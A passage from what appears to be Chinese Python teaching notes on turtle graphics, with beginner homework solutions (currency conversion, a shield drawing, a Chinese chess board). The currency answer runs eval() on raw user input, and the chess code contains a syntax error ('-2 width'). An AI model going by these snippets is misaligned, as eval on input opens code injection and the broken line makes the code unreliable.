<p>程序中，我们让小乌龟向-40度启动爬行，即：向东南方向40度。</p>
<p>（4）Turtle空间坐标体系</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#绝对坐标（画布坐标）</span></span><br><span class="line">	<span class="keyword">import</span> turtle</span><br><span class="line">	turtle.goto(<span class="number">100</span>, <span class="number">100</span>)</span><br><span class="line">	turtle.goto(<span class="number">100</span>, -<span class="number">100</span>)</span><br><span class="line">	turtle.goto(-<span class="number">100</span>,-<span class="number">100</span>)</span><br><span class="line">	turtle.goto(-<span class="number">100</span>,<span class="number">100</span>)</span><br><span class="line">	turtle.goto(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">	turtle.done()</span><br></pre></td></tr></table></figure>

<p>前进方向、右侧方向、左侧方向、正后方向：Turtle.circle(r, angle)、Turtle.bk(d)、Turtle.fd(d)</p>
<p><strong>练习题：请尝试用turtle画一个“正三角形”</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"><span class="comment"># 设置画布</span></span><br><span class="line">screen = turtle.Screen()</span><br><span class="line">screen.title(<span class="string">&quot;正三角形绘制&quot;</span>)</span><br><span class="line"><span class="comment"># 创建海龟对象</span></span><br><span class="line">t = turtle.Turtle()</span><br><span class="line">t.shape(<span class="string">&quot;turtle&quot;</span>)  <span class="comment"># 设置海龟形状</span></span><br><span class="line">t.color(<span class="string">&quot;blue&quot;</span>)    <span class="comment"># 设置画笔颜色</span></span><br><span class="line">t.pensize(<span class="number">3</span>)      <span class="comment"># 设置画笔粗细</span></span><br><span class="line"><span class="comment"># 绘制正三角形（每条边长度200，内角60度）</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    t.forward(<span class="number">200</span>)  <span class="comment"># 前进200像素</span></span><br><span class="line">    t.left(<span class="number">120</span>)     <span class="comment"># 左转120度（外角）</span></span><br><span class="line"><span class="comment"># 完成绘制</span></span><br><span class="line">turtle.done()</span><br></pre></td></tr></table></figure>

<p>（5）turtle.circle()函数功能</p>
<p>a.turtle.circle()函数<strong>让小乌龟沿着一个圆形爬行</strong></p>
<p>b.参数rad描述圆形轨迹半径的位置：这个半径在小乌龟运行的左侧rad远位置处，如果rad为负值，则半径在小乌龟运行的右侧</p>
<p>c.参数angle表示小乌龟沿着圆形爬行的弧度值（就是圆的度数）</p>
<p>（6）turtle.fd()函数功能</p>
<p>turtle.fd()函数<strong>也可以用turtle.forward()表示乌龟向前直线爬行移动</strong></p>
<p>表示小乌龟向前直线爬行移动，它有一个参数表示爬行的距离</p>
<p>turtle.left(角度), turtle.right(角度) 小乌龟以当前位置为准，向左&#x2F;右调整行进方向</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#一个简单的例子</span></span><br><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line">turtle.left(<span class="number">45</span>)</span><br><span class="line">turtle.fd(<span class="number">100</span>)</span><br><span class="line">turtle.left(<span class="number">135</span>)</span><br><span class="line">turtle.fd(<span class="number">200</span>)</span><br><span class="line">turtle.right(<span class="number">135</span>)</span><br><span class="line">turtle.fd(<span class="number">100</span>)</span><br><span class="line">turtle.done()</span><br></pre></td></tr></table></figure>

<p>（7）Turtle填充颜色</p>
<p>开始填充 turtle.begin_fill()，结束填充 turtle.end_fill()，选择颜色 turtle.fillcolor(“颜色”)</p>
<p>*<strong>练习：奥运五环个人代码</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line">turtle.setup(<span class="number">1000</span>,<span class="number">600</span>,<span class="number">200</span>,<span class="number">200</span>)<span class="comment">#前两个为画布长宽，后两个为画布距离屏幕左上角距离</span></span><br><span class="line">turtle.pensize(<span class="number">10</span>)<span class="comment">#画笔大小</span></span><br><span class="line"></span><br><span class="line">turtle.penup()<span class="comment">#抬起画笔</span></span><br><span class="line">turtle.seth(<span class="number">0</span>)<span class="comment">#设置朝向，负为顺时针，0正常从底部逆时针</span></span><br><span class="line">turtle.fd(-<span class="number">150</span>)<span class="comment">#往前+/后-走150个(看符号)，penup了不留痕迹</span></span><br><span class="line">turtle.pendown()<span class="comment">#放下画笔</span></span><br><span class="line"></span><br><span class="line">turtle.pencolor(<span class="string">&quot;blue&quot;</span>)<span class="comment">#颜色</span></span><br><span class="line">turtle.circle(<span class="number">60</span>,<span class="number">360</span>)<span class="comment">#画了一个360度的圆</span></span><br><span class="line"></span><br><span class="line">turtle.penup()<span class="comment">#抬起画笔</span></span><br><span class="line">turtle.fd(<span class="number">150</span>)<span class="comment">#往前+/后-走150个(看符号)，penup了不留痕迹</span></span><br><span class="line">turtle.pendown()<span class="comment">#放下画笔</span></span><br><span class="line">turtle.pencolor(<span class="string">&quot;black&quot;</span>)<span class="comment">#颜色</span></span><br><span class="line">turtle.circle(<span class="number">60</span>,<span class="number">360</span>)<span class="comment">#画了一个360度的圆</span></span><br><span class="line"></span><br><span class="line">turtle.penup()<span class="comment">#抬起画笔</span></span><br><span class="line">turtle.fd(<span class="number">150</span>)<span class="comment">#往前+/后-走150个(看符号)，penup了不留痕迹</span></span><br><span class="line">turtle.pendown()<span class="comment">#放下画笔</span></span><br><span class="line">turtle.pencolor(<span class="string">&quot;red&quot;</span>)<span class="comment">#颜色</span></span><br><span class="line">turtle.circle(<span class="number">60</span>,<span class="number">360</span>)<span class="comment">#画了一个360度的圆</span></span><br><span class="line"></span><br><span class="line">turtle.penup()<span class="comment">#抬起画笔</span></span><br><span class="line">turtle.seth(<span class="number">45</span>)<span class="comment">#设置朝向，负为顺时针，0正常从底部逆时针</span></span><br><span class="line">turtle.fd(-<span class="number">45</span>)<span class="comment">#往前+/后-走45个(看符号)，penup了不留痕迹</span></span><br><span class="line">turtle.pendown()<span class="comment">#放下画笔</span></span><br><span class="line">turtle.pencolor(<span class="string">&quot;green&quot;</span>)<span class="comment">#颜色</span></span><br><span class="line">turtle.circle(<span class="number">60</span>,<span class="number">360</span>)<span class="comment">#画了一个360度的圆</span></span><br><span class="line"></span><br><span class="line">turtle.penup()<span class="comment">#抬起画笔</span></span><br><span class="line">turtle.seth(<span class="number">5</span>)<span class="comment">#设置朝向，负为顺时针，0正常从底部逆时针</span></span><br><span class="line">turtle.fd(-<span class="number">190</span>)<span class="comment">#往前+/后-走190个(看符号)，penup了不留痕迹</span></span><br><span class="line">turtle.pendown()<span class="comment">#放下画笔</span></span><br><span class="line">turtle.pencolor(<span class="string">&quot;yellow&quot;</span>)<span class="comment">#颜色</span></span><br><span class="line">turtle.circle(<span class="number">60</span>,<span class="number">360</span>)<span class="comment">#画了一个360度的圆</span></span><br><span class="line"></span><br><span class="line">turtle.done()</span><br></pre></td></tr></table></figure>

<h2 id="函数封装"><a href="#函数封装" class="headerlink" title="函数封装"></a><strong>函数封装</strong></h2><h3 id="蟒蛇程序功能"><a href="#蟒蛇程序功能" class="headerlink" title="蟒蛇程序功能"></a>蟒蛇程序功能</h3><p>可以分成两类：<strong>绘制图形前对画笔的设置，包括颜色、尺寸、初始位置等以及绘制Python蟒蛇的功能。</strong></p>
<p>由于蟒蛇绘制的功能相对独立，可以用函数来封装</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#e2.3DrawPython.py</span></span><br><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drawSnake</span>(<span class="params">radius,angle,length</span>):</span><br><span class="line">    turtle.seth(-<span class="number">40</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        turtle.circle(radius,angle)</span><br><span class="line">        turtle.circle(-radius,angle)</span><br><span class="line">    turtle.circle(radius,angle/<span class="number">2</span>)</span><br><span class="line">    turtle.fd(<span class="number">40</span>)</span><br><span class="line">    turtle.circle(<span class="number">16</span>,<span class="number">180</span>)</span><br><span class="line">    turtle.fd(<span class="number">40</span>*<span class="number">2</span>/<span class="number">3</span>)</span><br><span class="line">turtle.setup(<span class="number">650</span>,<span class="number">350</span>,<span class="number">200</span>,<span class="number">200</span>)</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.fd(-<span class="number">250</span>)</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.pensize(<span class="number">25</span>)</span><br><span class="line">turtle.pencolor(<span class="string">&quot;purple&quot;</span>)</span><br><span class="line">drawSnake(<span class="number">40</span>,<span class="number">80</span>,<span class="number">4</span>)</span><br><span class="line">turtle.done()</span><br></pre></td></tr></table></figure>

<h3 id="def定义函数"><a href="#def定义函数" class="headerlink" title="def定义函数"></a>def定义函数</h3><p>def用于定义函数。函数是一组代码的集合，用于表达一个功能，或者说，函数表示一组代码的归属，函数名称是这段代码的名字。</p>
<p>def所定义的函数在程序中未经调用不能直接执行，需要通过函数名调用才能够执行。</p>
<h1 id="Python第一次作业"><a href="#Python第一次作业" class="headerlink" title="Python第一次作业"></a>Python第一次作业</h1><p><strong>作业1：说句心里话A</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="built_in">input</span>()</span><br><span class="line">message = <span class="built_in">input</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span>，我想对你说，<span class="subst">&#123;message&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>作业2：货币转换1</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="built_in">input</span>()</span><br><span class="line">b=a[:<span class="number">3</span>]</span><br><span class="line">c=a[<span class="number">3</span>:]</span><br><span class="line"><span class="keyword">if</span> b==<span class="string">&quot;RMB&quot;</span>:</span><br><span class="line">    d=(<span class="built_in">eval</span>(c)/<span class="number">6.78</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;USD&#123;:.2f&#125;&quot;</span>.<span class="built_in">format</span>(d))</span><br><span class="line"><span class="keyword">elif</span> b==<span class="string">&quot;USD&quot;</span>:</span><br><span class="line">    d=(<span class="built_in">eval</span>(c)*<span class="number">6.78</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;RMB&#123;:.2f&#125;&quot;</span>.<span class="built_in">format</span>(d))</span><br></pre></td></tr></table></figure>

<p><strong>作业3：垂直的世界，你好！</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&quot;世界，你好！&quot;</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(char)</span><br></pre></td></tr></table></figure>

<p><strong>作业4：美国队长盾牌</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="comment"># 最大圆半径240，最小圆的半径是60，由大到小依次减少60</span></span><br><span class="line"><span class="comment"># 由外向内填充颜色依次是红、白、红、蓝</span></span><br><span class="line">turtle.speed(<span class="number">0</span>)  <span class="comment"># 设置turtle的速度为最快</span></span><br><span class="line">color_list = [<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;white&#x27;</span>, <span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;blue&#x27;</span>]  <span class="comment"># 填充颜色</span></span><br><span class="line">xy_list = [(<span class="number">0</span>, -<span class="number">240</span>), (<span class="number">0</span>, -<span class="number">180</span>), (<span class="number">0</span>, -<span class="number">120</span>), (<span class="number">0</span>, -<span class="number">60</span>)]  <span class="comment"># 从大到小四个圆的起始点坐标</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    turtle.goto(xy_list[i])</span><br><span class="line">    turtle.pencolor(color_list[i])</span><br><span class="line">    turtle.fillcolor(color_list[i])</span><br><span class="line">    turtle.begin_fill()</span><br><span class="line">    turtle.circle(<span class="number">240</span>-i*<span class="number">60</span>,<span class="number">360</span>)</span><br><span class="line">    turtle.end_fill()</span><br><span class="line"><span class="comment"># 内接五角星的边长，数学问题</span></span><br><span class="line">width = (math.sin(math.radians(<span class="number">36</span>)) * <span class="number">60</span>) / math.sin(math.radians(<span class="number">126</span>))</span><br><span class="line"><span class="comment"># 绘制内接五角，填充白色</span></span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.goto(<span class="number">0</span>,<span class="number">60</span>) <span class="comment">#画笔移动到最小圆的最高点</span></span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.right(<span class="number">72</span>) <span class="comment">#设置画笔起始角度</span></span><br><span class="line">turtle.pencolor(<span class="string">&#x27;white&#x27;</span>) <span class="comment">#设置画笔颜色为白色</span></span><br><span class="line">turtle.fillcolor(<span class="string">&#x27;white&#x27;</span>) <span class="comment">#设置填充颜色为白色</span></span><br><span class="line">turtle.begin_fill() <span class="comment">#开始填充</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):  <span class="comment">#循环画五角星的外轮廓</span></span><br><span class="line">    turtle.fd(width)</span><br><span class="line">    turtle.left(<span class="number">72</span>)</span><br><span class="line">    turtle.fd(width)</span><br><span class="line">    turtle.right(<span class="number">144</span>)</span><br><span class="line">turtle.end_fill() <span class="comment">#结束填充</span></span><br><span class="line"><span class="comment">#=======================================================</span></span><br><span class="line">turtle.hideturtle()</span><br><span class="line">turtle.done()</span><br></pre></td></tr></table></figure>

<p><strong>作业5：绘制中国象棋</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle <span class="keyword">as</span> t</span><br><span class="line">width = <span class="number">60</span>  <span class="comment"># 定义全局变量，每个单元格的宽度</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw_chessboard</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;绘制棋盘的方格&quot;&quot;&quot;</span></span><br><span class="line">    t.penup()</span><br><span class="line">    t.goto(x-<span class="number">0.3</span>*width, y-<span class="number">0.3</span>*width)</span><br><span class="line">    t.color(<span class="string">&#x27;black&#x27;</span>,<span class="string">&#x27;orange&#x27;</span>)</span><br><span class="line">    t.begin_fill()</span><br><span class="line">    t.goto(x+<span class="number">8.3</span>*width,y-<span class="number">0.3</span>*width)</span><br><span class="line">    t.goto(x+<span class="number">8.3</span>*width,y+<span class="number">9.3</span>*width)</span><br><span class="line">    t.goto(x-<span class="number">0.3</span>*width,y+<span class="number">9.3</span>*width)</span><br><span class="line">    t.end_fill()</span><br><span class="line"></span><br><span class="line">    t.pendown()</span><br><span class="line">    t.goto(x-<span class="number">0.3</span>*width, y-<span class="number">0.3</span>*width)</span><br><span class="line">    t.goto(x+<span class="number">8.3</span>*width, y-<span class="number">0.3</span>*width)</span><br><span class="line">    t.goto(x+<span class="number">8.3</span>*width, y+<span class="number">9.3</span>*width)</span><br><span class="line">    t.goto(x-<span class="number">0.3</span>*width, y+<span class="number">9.3</span>*width)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        t.penup()</span><br><span class="line">        t.goto(x, y+i*width)</span><br><span class="line">        t.pendown()</span><br><span class="line">        t.forward(<span class="number">8</span>*width)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        start_x = x+i*width</span><br><span class="line">        t.penup()</span><br><span class="line">        t.goto(start_x, y)</span><br><span class="line">        t.pendown()</span><br><span class="line">        t.goto(start_x, y+<span class="number">4</span>*width)</span><br><span class="line">    t.penup()</span><br><span class="line">    t.goto(x, y+<span class="number">8</span>*width)</span><br><span class="line">    t.pendown()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">10</span>):</span><br><span class="line">        t.penup()</span><br><span class="line">        t.goto(x, y+i*width)</span><br><span class="line">        t.pendown()</span><br><span class="line">        t.forward(<span class="number">8</span>*width)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        start_x = x+i*width</span><br><span class="line">        t.penup()</span><br><span class="line">        t.goto(start_x, y+<span class="number">5</span>*width)</span><br><span class="line">        t.pendown()</span><br><span class="line">        t.goto(start_x, y+<span class="number">9</span>*width)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw_camp</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;绘制将帅营的斜线&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 红方九宫格斜线</span></span><br><span class="line">    t.penup()</span><br><span class="line">    t.goto(-width,-<span class="number">4</span>*width)</span><br><span class="line">    t.pendown()</span><br><span class="line">    t.goto(width,-<span class="number">2</span>*width)</span><br><span class="line">    t.penup()</span><br><span class="line">    t.goto(-width,-<span class="number">2</span> width)</span><br><span class="line">    t.pendown()</span><br><span class="line">    t.goto(width,-<span class="number">4</span>*width)</span><br><span class="line">    <span class="comment"># 黑方九宫格斜线</span></span><br><span class="line">    t.penup()</span><br><span class="line">    t.goto(-width,<span class="number">3</span>*width)</span><br><span class="line">    t.pendown()</span><br><span class="line">    t.goto(width,<span class="number">5</span>*width)</span><br><span class="line">    t.penup()</span><br><span class="line">    t.goto(-width,<span class="number">5</span>*width)</span><br><span class="line">    t.pendown()</span><br><span class="line">    t.goto(width,<span class="number">3</span>*width)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">marker</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;在指定位置绘制标记&quot;&quot;&quot;</span></span><br><span class="line">    t.penup()</span><br><span class="line">    t.goto(x, y)</span><br><span class="line">    t.pendown()</span><br><span class="line">    t.dot(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw_marker_gun</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;绘制炮位标记&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 红方炮位</span></span><br><span class="line">    marker(-<span class="number">3</span>*width,-<span class="number">2</span>*width)</span><br><span class="line">    marker(<span class="number">3</span>*width,-<span class="number">2</span>*width)</span><br><span class="line">    <span class="comment"># 黑方炮位</span></span><br><span class="line">    marker(-<span class="number">3</span>*width,<span class="number">3</span>*width)</span><br><span class="line">    marker(<span class="number">3</span>*width,<span class="number">3</span>*width)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw_marker_soldier</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;绘制兵卒位标记&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 红方兵位</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>]:</span><br><span class="line">        x = -<span class="number">4</span>*width+i*width</span><br><span class="line">        y = -<span class="number">4</span>*width+<span class="number">3</span>*width</span><br><span class="line">        marker(x,y)</span><br><span class="line">    <span class="comment"># 黑方卒位</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>]:</span><br><span class="line">        x = -<span class="number">4</span>*width+i*width</span><br><span class="line">        y = -<span class="number">4</span>*width+<span class="number">6</span>*width</span><br><span class="line">        marker(x,y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">piece_circle</span>(<span class="params">radius</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;绘制棋子圆形&quot;&quot;&quot;</span></span><br><span class="line">    t.begin_fill()</span><br><span class="line">    t.circle(radius)</span><br><span class="line">    t.end_fill()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">piece_font</span>(<span class="params">text, fontColor</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;在棋子上写文字&quot;&quot;&quot;</span></span><br><span class="line">    t.color(fontColor)</span><br><span class="line">    t.write(text, align=<span class="string">&#x27;center&#x27;</span>, font=(<span class="string">&#x27;楷体&#x27;</span>, <span class="number">25</span>, <span class="string">&#x27;bold&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw_boundary</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;绘制楚河汉界文字&quot;&quot;&quot;</span></span><br><span class="line">    t.penup()</span><br><span class="line">    t.goto(-<span class="number">2</span>*width,<span class="number">0.25</span>*width)</span><br><span class="line">    t.color(<span class="string">&#x27;green&#x27;</span>)</span><br><span class="line">    t.write(<span class="string">&quot;楚&quot;</span>, align=<span class="string">&#x27;center&#x27;</span>, font=(<span class="string">&#x27;楷体&#x27;</span>, <span class="number">25</span>, <span class="string">&#x27;bold&#x27;</span>))</span><br><span class="line">    t.goto(-<span class="number">0.66</span>*width,<span class="number">0.25</span>*width)</span><br><span class="line">    t.write(<span class="string">&quot;河&quot;</span>, align=<span class="string">&#x27;center&#x27;</span>, font=(<span class="string">&#x27;楷体&#x27;</span>, <span class="number">25</span>, <span class="string">&#x27;bold&#x27;</span>))</span><br><span class="line">    t.goto(<span class="number">0.66</span>*width,<span class="number">0.25</span>*width)</span><br><span class="line">    t.write(<span class="string">&quot;汉&quot;</span>, align=<span class="string">&#x27;center&#x27;</span>, font=(<span class="string">&#x27;楷体&#x27;</span>, <span class="number">25</span>, <span class="string">&#x27;bold&#x27;</span>))</span><br><span class="line">    t.goto(<span class="number">2</span>*width,<span class="number">0.25</span>*width)</span><br><span class="line">    t.write(<span class="string">&quot;界&quot;</span>, align=<span class="string">&#x27;center&#x27;</span>, font=(<span class="string">&#x27;楷体&#x27;</span>, <span class="number">25</span>, <span class="string">&#x27;bold&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw_piece_soldier</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;绘制兵和卒的棋子&quot;&quot;&quot;</span></span><br><span class="line">    radius = width*<span class="number">0.4</span></span><br><span class="line">    <span class="comment"># 红方兵</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>]:</span><br><span class="line">        x_pos=-<span class="number">4</span>*width+i*width</span><br><span class="line">        y_pos=-<span class="number">4</span>*width+<span class="number">3</span>*width</span><br><span class="line">        t.penup()</span><br><span class="line">        t.goto(x_pos, y_pos-radius)</span><br><span class="line">        t.setheading(<span class="number">0</span>)</span><br><span class="line">        t.pendown()</span><br><span class="line">        t.pencolor(<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">        t.fillcolor(<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">        piece_circle(radius)</span><br><span class="line">        t.penup()</span><br><span class="line">        t.goto(x_pos,y_pos-<span class="number">0.25</span>*width)</span><br><span class="line">        piece_font(<span class="string">&#x27;兵&#x27;</span>,<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">    <span class="comment"># 黑方卒</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>]:</span><br><span class="line">        x_pos=-<span class="number">4</span>*width+i*width</span><br><span class="line">        y_pos=-<span class="number">4</span>*width+<span class="number">6</span>*width</span><br><span class="line">        t.penup()</span><br><span class="line">        t.goto(x_pos, y_pos-radius)</span><br><span class="line">        t.setheading(<span class="number">0</span>)</span><br><span class="line">        t.pendown()</span><br><span class="line">        t.pencolor(<span class="string">&#x27;green&#x27;</span>)</span><br><span class="line">        t.fillcolor(<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">        piece_circle(radius)</span><br><span class="line">        t.penup()</span><br><span class="line">        t.goto(x_pos,y_pos-<span class="number">0.25</span>*width)</span><br><span class="line">        piece_font(<span class="string">&#x27;卒&#x27;</span>,<span class="string">&#x27;green&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw_piece_gun</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;绘制炮的棋子&quot;&quot;&quot;</span></span><br><span class="line">    radius = width * <span class="number">0.4</span></span><br><span class="line">    <span class="comment"># 红方砲</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">7</span>]:</span><br><span class="line">        x_pos = -<span class="number">4</span> * width + i * width</span><br><span class="line">        y_pos = -<span class="number">4</span> * width + <span class="number">2</span> * width</span><br><span class="line">        t.penup()</span><br><span class="line">        t.goto(x_pos, y_pos - radius)</span><br><span class="line">        t.setheading(<span class="number">0</span>)</span><br><span class="line">        t.pendown()</span><br><span class="line">        t.pencolor(<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">        t.fillcolor(<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">        piece_circle(radius)</span><br><span class="line">        t.penup()</span><br><span class="line">        t.goto(x_pos, y_pos-<span class="number">0.25</span>*width)</span><br><span class="line">        piece_font(<span class="string">&#x27;砲&#x27;</span>, <span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">    <span class="comment"># 黑方炮</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">7</span>]:</span><br><span class="line">        x_pos = -<span class="number">4</span> * width + i * width</span><br><span class="line">        y_pos = -<span class="number">4</span> * width + <span class="number">7</span> * width</span><br><span class="line">        t.penup()</span><br><span class="line">        t.goto(x_pos, y_pos - radius)</span><br><span class="line">        t.setheading(<span class="number">0</span>)</span><br><span class="line">        t.pendown()</span><br><span class="line">        t.pencolor(<span class="string">&#x27;green&#x27;</span>)</span><br><span class="line">        t.fillcolor(<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">        piece_circle(radius)</span><br><span class="line">        t.penup()</span><br><span class="line">        t.goto(x_pos, y_pos-<span class="number">0.25</span>*width)</span><br><span class="line">        piece_font(<span class="string">&#x27;炮&#x27;</span>, <span class="string">&#x27;green&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw_piece_other</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;为其他棋子增加文字&quot;&quot;&quot;</span></span><br><span class="line">    radius = width * <span class="number">0.4</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        t.penup()</span><br><span class="line">        t.goto(-<span class="number">4</span> * width + i * width, -<span class="number">4</span> * width - radius)</span><br><span class="line">        t.setheading(<span class="number">0</span>)</span><br><span class="line">        t.pendown()</span><br><span class="line">        t.pencolor(<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">        t.fillcolor(<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">        piece_circle(radius)</span><br><span class="line">        t.penup()</span><br><span class="line">        t.goto(-<span class="number">4</span> * width + i * width, -<span class="number">4.25</span>*width)</span><br><span class="line">        piece_font(chess_pieces[<span class="number">0</span>][i], <span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        t.penup()</span><br><span class="line">        t.goto(-<span class="number">4</span> * width + i * width, -<span class="number">4</span> * width + <span class="number">9</span> * width - radius)</span><br><span class="line">        t.setheading(<span class="number">0</span>)</span><br><span class="line">        t.pendown()</span><br><span class="line">        t.pencolor(<span class="string">&#x27;green&#x27;</span>)</span><br><span class="line">        t.fillcolor(<span class="string">&#x27;white&#x27;</span>)</span><br><span class="line">        piece_circle(radius)</span><br><span class="line">        t.penup()</span><br><span class="line">        t.goto(-<span class="number">4</span> * width + i * width, <span class="number">4.75</span>* width)</span><br><span class="line">        piece_font(chess_pieces[<span class="number">1</span>][i], <span class="string">&#x27;green&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># t.tracer(10)  # 取消注释可加速刷新，提高绘制速度</span></span><br><span class="line">    t.speed(<span class="number">0</span>)                                   <span class="comment"># 绘制速度</span></span><br><span class="line">    t.pensize(<span class="number">2</span>)                                 <span class="comment"># 画笔粗线</span></span><br><span class="line">    width = <span class="number">60</span>                                   <span class="comment"># 设置每格宽度</span></span><br><span class="line">    t.screensize(<span class="number">10</span> * width, <span class="number">12</span> * width)         <span class="comment"># 画布大小</span></span><br><span class="line">    pos_of_x, pos_of_y = -<span class="number">4</span> * width, -<span class="number">4</span> * width  <span class="comment"># 画笔初始坐标</span></span><br><span class="line">    chess_pieces = [[<span class="string">&#x27;車&#x27;</span>, <span class="string">&#x27;馬&#x27;</span>, <span class="string">&#x27;相&#x27;</span>, <span class="string">&#x27;仕&#x27;</span>, <span class="string">&#x27;帅&#x27;</span>, <span class="string">&#x27;仕&#x27;</span>, <span class="string">&#x27;相&#x27;</span>, <span class="string">&#x27;馬&#x27;</span>, <span class="string">&#x27;車&#x27;</span>, <span class="string">&#x27;兵&#x27;</span>, <span class="string">&#x27;砲&#x27;</span>],[<span 